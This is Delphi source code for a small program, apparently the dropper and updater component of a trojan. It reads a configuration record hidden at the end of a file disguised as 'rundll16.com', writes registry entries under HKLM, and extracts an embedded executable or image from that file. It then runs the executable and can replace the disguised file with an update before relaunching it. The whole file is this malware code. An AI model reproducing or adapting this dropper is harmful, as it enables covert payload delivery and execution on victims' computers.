program nodll;
uses Windows,Registry,LZExpand,Classes, SysUtils;
type _info=packed record
      doit:boolean;
      name:string[20];
      uin:integer;
      cesafaca:byte; {[1=nothing, 2=jpg file, 3=run exe file]}
      attachsize:integer;
     end;
var f:file;
    info:_info;
    cicanume:string;
    namers:boolean;
    s:string;
    strm1,strm2:TFileStream;
    parami:boolean;
    
Function WinPath:String;
var d:integer;
    res:string;
begin
 setlength(res,500);
 d:=getwindowsdirectory(pchar(res),500);
 setlength(res,d);
{ result:=fixpath(result,result);}
result:=res;
end;

procedure SetKey(sProgTitle,SCmdLine:string);
var sKey:String;
    reg:TRegIniFile;
begin
 sKey:='';
 reg:=TRegIniFile.Create('');
 reg.RootKey:=HKEY_LOCAL_MACHINE;
 try reg.WriteString('Software\Microsoft\Windows\CurrentVersion\ss'
                +sKey+#0,sProgTitle,sCmdLine);
 except end;
 reg.Free;
end;
function FileCopy( src, dest: String): Boolean;
var s, d: TOFStruct;
    fs, fd: Integer;
    fnSrc, fnDest: PChar;
begin
      src:=src + #0;dest:=dest + #0;
      fnSrc:=@src[1];
      fnDest:=@dest[1];
      fs := LZOpenFile( fnSrc, s, OF_READ );
      fd := LZOpenFile( fnDest, d, OF_CREATE );
      if LZCopy( fs, fd ) < 0 then
         Result:=False else Result:=True;
      LZClose( fs );
      LZClose( fd );
end;
procedure Delay(msecs:integer);
var
   FirstTickCount:longint;
begin
     FirstTickCount:=GetTickCount;
     repeat
     until ((GetTickCount-FirstTickCount) >= Longint(msecs));
end;
procedure SaveExtraInfo(deunde:string);
begin
{delay(2000);}
repeat
try
 namers:=false;
 assignfile(f,paramstr(3)+'\'+'rundll16.com');
 reset(f,1);
 seek(f,filesize(f)-sizeof(info));
 blockread(f,info,sizeof(info));
 closefile(f);
except namers:=true;end;
delay(1000);
until not namers;
if info.doit then begin
try
 str(info.uin,s);
 SetKey('ProgramName',info.name);
 SetKey('no',s);
 SetKey('Enabled','true');
except end;end;
parami:=false;

if (((info.cesafaca=2) or (info.cesafaca=3)) and (info.attachsize<>0)) then begin
 case info.cesafaca of
  3:cicanume:='~tefut.exe';
  2:begin parami:=true;cicanume:='~petine.jpg';end;
 end;
 strm1:=TFileStream.Create(paramstr(3)+'\'+'rundll16.com',fmOpenRead);
 if FileExists(paramstr(3)+'\'+cicanume) then
  strm2:=TFileStream.Create(paramstr(3)+'\'+cicanume,fmOpenWrite)
 else
  strm2:=TFileStream.Create(paramstr(3)+'\'+cicanume,fmCreate);
 strm1.seek(-(info.attachsize+sizeof(info)),soFromEnd);
 strm2.copyfrom(strm1,info.attachsize);
 strm2.free;
 strm1.free;
end;

if info.CeSaFaca=3 then
 try winexec(PChar(paramstr(3)+'\'+cicanume),SW_SHOWNORMAL);except end;
{execute file, or show image}
end;

function AreAccess(lace:string):boolean;
var f:file of byte;
begin
 try result:=true;
  assignfile(f,lace);
  reset(f);
 except result:=false;
{  close(f); }
 end;
end;

begin
  parami:=false;
  if paramstr(1)='FIRST' then SaveExtraInfo(paramstr(2));
  if (paramstr(1)='UPDATE') then
   try
    repeat delay(1000);until (AreAccess('rundll16.com')){ and (AreAccess('rundll16.com'))};
    FileCopy('mytmpdll.dll','rundll16.com');
   except
   end;
 {tre sa vada daca s-a inchis}
   if not parami then
    try winexec(PChar('rundll16.com'),SW_SHOWNORMAL);except end
   else
    try winexec(PChar('rundll16.com /SEE '+IntToStr(info.CeSaFaca)),SW_SHOWNORMAL);except end;
{halt;}
end.
